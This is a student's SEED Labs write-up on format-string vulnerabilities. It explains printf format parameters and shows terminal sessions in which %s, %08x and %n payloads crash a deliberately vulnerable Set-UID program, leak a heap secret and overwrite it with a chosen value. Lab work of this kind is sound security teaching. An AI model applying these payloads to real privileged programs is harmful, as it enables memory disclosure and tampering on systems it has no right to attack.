# SEEDlabs: Format-String Vulnerability Lab

#### Ozgur Ural
#### Student ID: 2564455

## Lab Description

The learning objective of this lab is for students to gain the first-hand experience on format-string vulnerability by putting what they have learned about the vulnerability from class into actions. The format-string vulnerability is caused by code like printf(user_input), where the contents of variable of user_input is provided by users. When this program is running with privileges (e.g., Set-UIDprogram), this printf statement becomes dangerous, because it can lead to one of the following consequences: (1) crash the program, (2) read from an arbitrary memory place, and (3) modify the values of in an arbitrary memory place. The last consequence is very dangerous because it can allow users to modify internal variables of a privileged program, and thus change the behavior of the program. 

In this lab, students will be given a program with a format-string vulnerability; their task is to develop a scheme to exploit the vulnerability. In addition to the attacks, students will be guided to  walk  through  a  protection  scheme  that  can  be  used  to  defeat  this  type  of  attacks.  Students need to evaluate whether the scheme work or not and explain why. 

It  should  be  noted  that  the  outcome  of  this  lab  is  operating  system  dependent.  Our description  and  discussion  are  based  on  Ubuntu  Linux.  It  should  also  work  in  the  most  recent version of Ubuntu. However, if you use different operating systems, different problems and issues might come up.

## Lab Tips
You can use the command line to convert between hex and decimal:

* hex to dec: echo $((16#894f00c)), here 894f00c is a sample hex value.
* dec to hex: echo ‘ibase=10;obase=16;123’ | bc, here 123 a sample decimal value


## Lab Tasks - Exploit the Vulnerability
The provided vul_prog.c is a format-string vulnerable program. In the following program, you will be asked to provide an input, which will be saved in a buffer called user_input. The program then prints  out  the  buffer  using  printf.  The  program  needs  to  be  compiled  and  made  as  a  Set-UIDprogram  (using  the  root  account),  i.e.,  it  runs  with  the  root  privilege.  Unfortunately,  there  is  a format-string vulnerability in the way how the printf is called on the user inputs. We want to exploit this vulnerability and see how much damage we can achieve. 

The program has two secret values stored in its memory, and you are interested in these secret values. However, the secret values are unknown to you, nor can you find them from reading the  binary  code  (for  the  sake  of  simplicity,  we  hardcode  the  secrets  using  constants  0x44  and 0x55). Although you do not know the secret values, in practice, it is not so difficult to find out the memory  address  (the  range  or  the  exact  value)  of  them  (they  are  in  consecutive  addresses), because for many operating systems, the addresses are exactly the same anytime you run the program.  In  this  lab,  we  just  assume  that  you  have  already  known  the  exact  addresses.  To achieve this, the program “intentionally” prints out the addresses for you. With such knowledge, your goal is to achieve the followings (not necessarily at the same time):

* Crash the program.
* Print out the secret[1] value.
* Modify the secret[1] value.
* Modify the secret[1] value to a pre-determined value (0x50). [Hint: think about %n]

Note that the binary code of the program (Set-UID) is only readable/executable by you, and there is no way you can modify the code. Namely, you need to achieve the above objectives without modifying the vulnerable code. However, you do have a copy of the source code, which can help you design your attacks.

Hints: From the printout, you will find out that secret[0] and secret[1] are located on the heap, i.e., the actual secrets are stored on the heap. We also know that the address of the first secret (i.e., the  value  of  the  variable  secret)  can  be  found  on  the  stack,  because  the  variable  secret  is allocated on the stack. In other words, if you want to overwrite secret[0], its address is already on the stack; your format string can take advantage of this information. However, although secret[1]is just right after secret[0], its address is not available on the stack. This poses a major challenge for your format-string exploit, which needs to have the exact address right on the stack in order to read or write to that address.

## Guidelines

### What is a format string?

```c
printf("The magic number is: %d", 1911);
```

The text to be printed is "The magic number is:", followed by a format parameter '%d', which is replaced with the parameter (1911) in the output. Therefore the output looks like: The magic number is: 1911. In addition to %d, there are several other format parameters, each having different meaning. The following table summarizes these format parameters:

| Parameter | Mening | Passed as |
| - | - | - |
| %d | decimal (int) | value |
| %u | unsigned decimal (unsigned int) | value |
| %x | hexadecimal (unsigned int) | value |
| %s | string ((const) (unsigned) char *) | reference |
| %n | number of bytes written so far, (* int) | reference |

### The Stack and Format Strings

The behavior of the format function is controlled by the format string. The function retrieves the parameters requested by the format string from the stack.

```c
printf ("a has value %d, b has value %d, c is at address: %08x\n",a, b, &c); 
```

### What if there is a miss-match

What if there is a miss-match between the format string and the actual arguments?

```c
printf ("a has value %d, b has value %d, c is at address: %08x\n",a, b);
```

In the above example, the format string asks for 3 arguments, but the program actually provides only two.

Can this program pass the compiler?

- The function `printf()` is ddefined as function with variable length of arguments. Therefore, by looking at the number of arguments, everything looks fine.
- To find the miss-match, compiles needs to understand how `printf()` works and what the meaning of the formal string is. However, compilers usually do not do this kind of analysis.
- Sometimes, the format is not a constant string, it is generated during the execution of the program. Therefore, there is no way for the compiler to find the miss-match in this case.

Can `printf()` detect the miss-match?

- The function `printf()` fetches the arguments from the stack. If the format string needs 3 arguments, it will fetch 3 data items from the stack. Unless the stack is marked with a boundary, `printf()` does not know that it runs out of the arguments that are provided to it.
- Since there is no such a marking. `printf()` will continue fetching data from the stack. In a miss-match case, it will fetch some data that do not belong to this function call.

What trouble can be caused by `printf()` when it starts to fetch data that is meant for it?

### Viweing Memory at Any Location

We have to supply an address of the memory. However, we cannot change the code; we can only supply the format string.

If we use `printf(%s)` without specifying a memory address, the target address will be obtained from the anyway by the `printf()` function. The function maintains an initial stack pointer, so it knows the location of the parameters in the stack.

Observation: the format string is usually located on the stack. If we can encode the target address in the format string, the target address will be in the stack. In the following example, the format string is stored in a buffer, which is located on the stack.

```c
int main(int argc, char *argv[])
{
    char user_input[100];
    ... ... /* other variable definitions and statements */
    scanf("%s", user_input); /* getting a string from user */
    printf(user_input); /* Vulnerable place */
    return 0;
}
```

If we can force the printf to obtain the address from the format string (also on the stack), we can control the address.

```c
printf ("\x10\x01\x48\x08 %x %x %x %x %s");
```

`\x10\x01\x48\x08` are the four bytes of the target address. In C language, `\x10` in a string tells the compiler to put a hexadecimal value `0x10` in the current position. The value will take up just one byte. Without using `\x`, if we directly put "`10`" in a string, the ASCII values of the cahracters '`1`' and '`0`' will be stored. Their ASCII values are 49 and 48, respectively.

`%x` causes the stack pointer to move towards the format string.

Here is how the attack works if `user_input[]` cantains the following format string:
"`\x10\x01\x48\x08 %x %x %x %x %s`".


Basically, we use four `%x` to move the `printf()`'s pointer towards the address that we stored in the format string. Once we reach the destination, we will give `%s` to `printf()`, causeing it to print out the contents in the memory address `0x10014808`. The function `printf()` will treat the contents as a string, and print out the string until reaching the end of the string (i.e. 0).

The stack space between `user_input[]` and the address passed to the `printf()` function is not for `printf()`. However, because of the format-string vulnerability in the program, `printf()` considers them as the arguments to match with the `%x` in the format string.

The key challenge in this attack is to figure out the distance between the `user_input[]` and the address passed to the `printf()` function. This distance decides how many `%x` you need to insert into the format string, before giving `%s`.

### Writing an Integer to Memory

`%n`: The number of characters written so far is stored into the integer indicated by the corresponding argument.

```c
int i;
printf ("12345%n", &i);
```

It causes `printf()` to write 5 into variable i.

Using the same approach as that for viewing memory at any location, we can sause `printf()` to write an integer into any location. Just replace the `%s` in the above example with `%n`, and the contents at the address `0x10014808` will be overwritten.

Using this attack, attackers can do the following:

- Overwrite important program flags that control access privileges.
- Overwrite return addresses on the stack, function pointers, etc.

However, the value written is determined by the number of characters printed before the `%n` is reached. Is it really possible to write arbitrary integer values?

- Use dummy output characters. To write a value of 1000, a simple padding of 1000 dummy characters would do.
- To void long format strings, We can use a width specification of the format indicators.

## Lab Tasks

### Crash the Program:

```sh
root@VM:/home/seed/lab2# gcc -o vul_prog vul_prog.c
vul_prog.c: In function ‘main’:
vul_prog.c:31:12: warning: format not a string literal and no format arguments [-Wformat-security]
     printf(user_input);
            ^
root@VM:/home/seed/lab2# chmod 4755 vul_prog
root@VM:/home/seed/lab2# ll vul_prog
-rwsr-xr-x 1 root root 7556 Oct  1 15:38 vul_prog*
root@VM:/home/seed/lab2# exit
exit
[10/01/21]seed@VM:~/lab2$ ./vul_prog
secret[0]'s address is 0x 9e7e008 (on heap)
secret[1]'s address is 0x 9e7e00c (on heap)
Please enter a decimal integer
333 
Please enter a string
%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
Segmentation fault
[10/01/21]seed@VM:~/lab2$ 

```
I compile the vul_prog.c. Then I run the program and enter our format string with a number of %s to crash it and see that there is a segmentation fault. If it is not a valid memory address, the program crashes. My program is crashed because it tried to reach a non valid memory adress with a number of %s. 


### Print out the `secret[1]` value:
```sh
[10/01/21]seed@VM:~/lab2$ ./vul_prog
secret[0]'s address is 0x 9a44008 (on heap)
secret[1]'s address is 0x 9a4400c (on heap)
Please enter a decimal integer
4
Please enter a string
%08x/%08x/%08x/%08x/%08x/%08x/%08x/%08x/%08x/%08x/%08x/          
bf8923a8/b77aa918/00f0b5ff/bf8923ce/00000001/000000c2/bf8924c4/00000004/09a44008/78383025/3830252f/
The original secrets: 0x44 -- 0x55
The new secrets:      0x44 -- 0x55
[10/01/21]seed@VM:~/lab2$
```
In order to find secret[1]'s memory address, I firstly tried to find the secret[0]'s memory address. In order to do that, I enter a random decimal integer and a number of %08x. I used "/" to improve the terminal outputs readability. I could successfully find the secret[0]'s address among the terminal output. I counted its location. Due to it is on heap, secret[1] is at the left side of the output. I determined how many %08x/ should add to find the secret[1] and use it as you can see on below. 


```sh
[10/01/21]seed@VM:~/lab2$ ./vul_prog
secret[0]'s address is 0x 9849008 (on heap)
secret[1]'s address is 0x 984900c (on heap)
Please enter a decimal integer
159682572
Please enter a string
%08x/%08x/%08x/%08x/%08x/%08x/%08x/%s  
bf8a6048/b77c0918/00f0b5ff/bf8a606e/00000001/000000c2/bf8a6164/U
The original secrets: 0x44 -- 0x55
The new secrets:      0x44 -- 0x55
[10/01/21]seed@VM:~/lab2$ 
```
0x 984900c is in hexadecimal format. Firstly I transform it to decimal format. It is 159682572 in decimal. I entered that value as the decimal integer input. Then I added 7 %08x/ which I found on the previous step. Then to see the value on that memory adress(secret[1]'s address is), I added %s at the end of the input.
And the terminal output ends with U as you can see above.
U's ascii value is 55. I could find the secret[1] value 0x55 correctly.

### Modify the `secret[1]` value:

```sh
[10/01/21]seed@VM:~/lab2$ ./vul_prog
secret[0]'s address is 0x 87c6008 (on heap)
secret[1]'s address is 0x 87c600c (on heap)
Please enter a decimal integer
142368780
Please enter a string
%08x/%08x/%08x/%08x/%08x/%08x/%08x/%n
bfe00a28/b77a1918/00f0b5ff/bfe00a4e/00000001/000000c2/bfe00b44/
The original secrets: 0x44 -- 0x55
The new secrets:      0x44 -- 0x3f
[10/01/21]seed@VM:~/lab2$ 
```

0x 87c600c is in hexadecimal format. Firstly I transform it to decimal format. It is 142368780 in decimal. I add %n to the position of secret[1]. When %n exsist in the format string, it writes the number of the string written to the variable that adress point to. The new secrets of secret[1] is changed as 0x3f as you can see above. 

###  Modify the secret[1] value to a pre-determined value:
```sh
[10/01/21]seed@VM:~/lab2$ ./vul_prog
secret[0]'s address is 0x 8478008 (on heap)
secret[1]'s address is 0x 847800c (on heap)
Please enter a decimal integer
138903564
Please enter a string
%08x/%08x/%08x/%08x/%08x/%08x/%08x22/%n  
bfed1248/b7791918/00f0b5ff/bfed126e/00000001/000000c2/bfed136422/
The original secrets: 0x44 -- 0x55
The new secrets:      0x44 -- 0x41
```

When %n exsist in the format string, it writes the number of the string written to the variable that adress point to. I added 2 more numbers in the format string and the value secret[1] is now 0x41. If I add 4 numbers in the format at string, the value of secret[1] will be 0x43 as can be seen below.

```sh
[10/01/21]seed@VM:~/lab2$ ./vul_prog
secret[0]'s address is 0x 8f38008 (on heap)
secret[1]'s address is 0x 8f3800c (on heap)
Please enter a decimal integer
150175756
Please enter a string
%08x/%08x/%08x/%08x/%08x/%08x/%08x2245/%n  
bf8e6d28/b776e918/00f0b5ff/bf8e6d4e/00000001/000000c2/bf8e6e442245/
The original secrets: 0x44 -- 0x55
The new secrets:      0x44 -- 0x43
[10/01/21]seed@VM:~/lab2$ 
```

With the same method I used previously, If I add 17 numbers in the format at string, the value of secret[1] will be 0x50 as can be seen below.
Because 0x50 - 0x3f = 0x11, and 0x11 is 17 in decimal format. 

```sh
[10/01/21]seed@VM:~/lab2$ ./vul_prog
secret[0]'s address is 0x 8bdd008 (on heap)
secret[1]'s address is 0x 8bdd00c (on heap)
Please enter a decimal integer
146657292
Please enter a string
%08x/%08x/%08x/%08x/%08x/%08x/%08x22451234567890123/%n
bfde2788/b7729918/00f0b5ff/bfde27ae/00000001/000000c2/bfde28a422451234567890123/
The original secrets: 0x44 -- 0x55
The new secrets:      0x44 -- 0x50
[10/01/21]seed@VM:~/lab2$ 
```

